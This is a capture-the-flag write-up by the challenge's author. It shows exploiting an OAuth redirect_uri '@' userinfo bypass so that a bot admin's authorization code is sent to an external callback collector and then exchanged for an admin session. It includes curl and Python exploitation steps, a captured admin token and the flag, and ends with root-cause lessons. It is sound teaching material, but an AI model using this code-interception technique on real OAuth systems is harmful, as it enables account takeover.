thi is the ctfs i created for ciphercase ctf hosted by cyscom club vit chennai ,
im part of this club as technical team member , # Better Call Back — Web Hard (500 pts) Writeup

## Challenge Description

> Madrigal Logistics has moved its supplier authentication to a new SSO provider. The regional shipment manifest is restricted to administrators.
>
> Gain access to the restricted shipment manifest.

**Flag format:** `CYS{...}`

**Provided URL:** `https://portal-rouge-delta.vercel.app/`

---

## Reconnaissance

### Main Portal (`portal-rouge-delta.vercel.app`)

The main portal is a Madrigal Logistics supplier operations portal with:

- **`/`** — Operations board (public)
- **`/login`** — Redirects to the SSO provider for authentication
- **`/admin/manifest`** — The target (returns 403, requires admin role)
- **`/legacy-admin`** — Deprecated admin console (found in `robots.txt`), has its own login form
- **`/report`** — "Trust & safety / reviewer channel" — submit malformed SSO URLs for review by an authenticated regional admin
- **`/callback-receiver`** — Redirects to an external callback receiver tool

**Key homepage hints:**
- `reviewer channel: standing by`
- `Session: guest`
- `Manifest: LOCKED`

### SSO Identity Provider (`idp-psi.vercel.app`)

The IDP handles authentication with:
- **`/login`** — Login form with demo credentials: `employee / employee`
- **`/authorize`** — OAuth2 authorization endpoint
- **`/token`** — OAuth2 token exchange endpoint
- **`/logout`** — Clears session, redirects to portal

### Callback Receiver (`collector-hazel-five.vercel.app`)

A temporary mailbox service for capturing OAuth callbacks:
- **`/new`** — Creates a temporary mailbox with a unique callback endpoint
- **`/collect?box=ID&code=X&state=Y`** — Receives and stores callbacks
- **`/mailbox/ID`** — Returns stored callbacks as JSON

### OAuth Flow (Normal)

```
User → Portal /login
  → Portal generates state, stores in Flask session cookie
  → 302 redirect to IDP: /authorize?client_id=supplier-portal&redirect_uri=https://portal-rouge-delta.vercel.app/callback&state=STATE
    → User authenticates at IDP (employee/employee)
    → IDP generates a signed code token: {"client_id":"supplier-portal","user":"employee","role":"user"}
    → 302 redirect to Portal /callback?code=CODE&state=STATE
      → Portal validates state against session cookie
      → Portal exchanges code at IDP /token endpoint
      → IDP returns {"role":"user","user":"employee"}
      → Portal sets session: {"role":"user","user":"employee"}
      → 302 redirect to /
```

### Flask Session Cookies

Both services use Flask-signed session cookies (itsdangerous HMAC-SHA1):

| Cookie | Payload | Purpose |
|--------|---------|---------|
| `madrigal_portal_session` | `{"oauth_state":"..."}` | Pre-auth state tracking |
| `madrigal_portal_session` | `{"role":"user","user":"employee"}` | Post-auth session |
| `madrigal_idp_session` | `{"user":"employee"}` | IDP session |

The **code token** is also a Flask-signed token containing the user's role and identity.

---

## Vulnerability Discovery

### 1. OAuth Redirect URI Validation Bypass (Open Redirect)

The IDP's `/authorize` endpoint validates the `redirect_uri` parameter, but the validation is vulnerable to **userinfo injection via `@` notation**.

**Normal redirect_uri:**
```
redirect_uri=https://portal-rouge-delta.vercel.app/callback
```

**Bypassed redirect_uri:**
```
redirect_uri=https://portal-rouge-delta.vercel.app@collector-hazel-five.vercel.app/collect?box=MAILBOX_ID
```

In URL parsing, `https://user@host/path` treats everything before `@` as userinfo credentials and everything after `@` as the actual host. The IDP's validation sees `portal-rouge-delta.vercel.app` in the URL and considers it valid, but the browser/HTTP client actually connects to `collector-hazel-five.vercel.app`.

**Proof:**
```bash
# Login to IDP as employee
curl -c cookies.txt -X POST https://idp-psi.vercel.app/login \
  -d "username=employee&password=employee"

# Visit authorize with @ bypass
curl -b cookies.txt -D - \
  "https://idp-psi.vercel.app/authorize?client_id=supplier-portal&redirect_uri=https://portal-rouge-delta.vercel.app@collector-hazel-five.vercel.app/collect?box=TESTBOX&state=test"

# Response: 302 Location: https://portal-rouge-delta.vercel.app@collector-hazel-five.vercel.app/collect?box=TESTBOX&code=...&state=test
# Actual destination: collector-hazel-five.vercel.app (NOT portal-rouge-delta.vercel.app)
```

### 2. Reviewer Channel as Attack Vector

The `/report` endpoint allows submitting SSO authorization URLs for review by an **authenticated regional admin** (the "reviewer"). When the reviewer processes a URL:

1. The reviewer receives the submitted URL
2. The reviewer authenticates at the IDP (as `regional.admin` with `role: admin`)
3. The IDP redirects to the `redirect_uri` in the URL
4. If the `redirect_uri` points to our callback receiver, we capture the admin's OAuth code

---

## Exploitation

### Step 1: Create a Callback Mailbox

```bash
curl https://collector-hazel-five.vercel.app/new?view=1
# Returns mailbox ID: eff745a493b3633b
# Callback endpoint: https://collector-hazel-five.vercel.app/collect?box=eff745a493b3633b
```

### Step 2: Craft the Malicious OAuth URL

Construct an authorization URL with the `@` bypass redirecting to our callback receiver:

```
https://idp-psi.vercel.app/authorize?client_id=supplier-portal&redirect_uri=https://portal-rouge-delta.vercel.app@collector-hazel-five.vercel.app/collect?box=eff745a493b3633b&state=success_test
```

### Step 3: Submit to the Reviewer

```bash
curl -X POST https://portal-rouge-delta.vercel.app/report \
  --data-urlencode "url=https://idp-psi.vercel.app/authorize?client_id=supplier-portal&redirect_uri=https://portal-rouge-delta.vercel.app@collector-hazel-five.vercel.app/collect?box=eff745a493b3633b&state=success_test"
```

**Response:** `200 — Report received` — "An authenticated regional reviewer inspected the link."

### Step 4: Capture the Admin Code

```bash
curl https://collector-hazel-five.vercel.app/mailbox/eff745a493b3633b
```

**Response:**
```json
[{
  "code": "eyJjbGllbnRfaWQiOiJzdXBwbGllci1wb3J0YWwiLCJ1c2VyIjoicmVnaW9uYWwuYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.apW1ng.bBxnFPstrdQAnkM4BH_FjaH3Uxw",
  "state": "success_test"
}]
```

**Decoded code payload:**
```json
{"client_id": "supplier-portal", "user": "regional.admin", "role": "admin"}
```

### Step 5: Exchange the Admin Code for a Session

```python
import requests

session = requests.Session()

# Get a fresh state from the portal
resp = session.get('https://portal-rouge-delta.vercel.app/login', allow_redirects=False)
state = resp.headers['Location'].split('state=')[1]

# Call the callback with the stolen admin code
admin_code = "eyJjbGllbnRfaWQiOiJzdXBwbGllci1wb3J0YWwiLCJ1c2VyIjoicmVnaW9uYWwuYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.apW1ng.bBxnFPstrdQAnkM4BH_FjaH3Uxw"
session.get(f'https://portal-rouge-delta.vercel.app/callback?code={admin_code}&state={state}')

# Session is now: {"role": "admin", "user": "regional.admin"}
```

### Step 6: Access the Admin Manifest

```python
resp = session.get('https://portal-rouge-delta.vercel.app/admin/manifest')
# Status: 200
# Flag: CYS{C4LLB4CKS_D0NT_PR0V3_1D3NT1TY}
```

---

## Flag

```
CYS{C4LLB4CKS_D0NT_PR0V3_1D3NT1TY}
```

**Translation:** `CALLBACKS DON'T PROVE IDENTITY`

---

## Root Cause Analysis

This challenge demonstrates an **OAuth callback interception attack** (also known as an "OAuth phishing" or "redirect_uri manipulation" attack). The vulnerability chain consists of:

1. **Weak redirect_uri validation** on the IDP — The `@` notation bypass allows redirecting callbacks to attacker-controlled domains while passing the IDP's validation check.

2. **Trusted reviewer channel** — The `/report` endpoint causes an authenticated admin to visit attacker-crafted URLs, effectively turning the admin into an unwitting participant in the attack.

3. **Callback-based authentication** — The portal trusts whatever code arrives at its `/callback` endpoint, regardless of how that code was obtained. The code itself is properly signed (preventing forgery), but the attacker can obtain a legitimate admin-signed code through the redirect_uri bypass.

### Security Lessons

- **Redirect URIs must be validated exactly** — no partial matching, no userinfo injection
- **OAuth callbacks alone don't prove identity** — the code proves the IDP issued it, but the redirect destination determines who receives it
- **Admin reviewer/bot systems can be weaponized** — any feature that causes privileged users to visit attacker-controlled URLs is a potential attack vector
- **Defense in depth** — even with signed tokens, the transport layer (redirect_uri) must be secured

---

## Tools Used

- `curl` — HTTP requests
- Python `requests` — Automated exploitation
- `flask-unsign` — Flask session analysis
- `base64` / `json` — Token decoding
- Callback receiver (`collector-hazel-five.vercel.app`) — Provided by the challenge
 writeup for deployed better call back
